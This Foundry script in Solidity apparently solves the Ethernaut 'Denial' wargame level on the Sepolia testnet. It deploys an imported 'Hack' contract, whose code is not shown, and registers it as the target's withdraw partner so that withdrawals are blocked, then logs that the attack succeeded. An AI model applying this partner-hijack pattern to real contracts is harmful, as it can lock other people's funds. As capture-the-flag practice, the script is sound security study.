// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack} from "../src/level20.sol";

interface IDenial {
    function partner() external view returns (address);

    function owner() external view returns (address);

    function setWithdrawPartner(address _partner) external;

    function withdraw() external;

    function contractBalance() external view returns (uint256);
}

contract Level20Script is Script {
    function run(address instanceAddress) external {
        IDenial target = IDenial(instanceAddress);
        address partnerBefore = target.partner();
        console.log("Partner before: ", partnerBefore);
        uint256 balanceBefore = target.contractBalance();
        console.log("Contract balance before: ", balanceBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(payable(instanceAddress));
        target.setWithdrawPartner(address(hackContract));
        vm.stopBroadcast();

        address partnerAfter = target.partner();
        console.log("Partner after: ", partnerAfter);
        console.log(
            "Attack successful: ",
            partnerAfter == address(hackContract)
        );
    }
}
//forge script script/level20.s.sol:Level20Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey --sig "run(address)" 0xb61f80157D71C278232B324e70e815a424A95b03
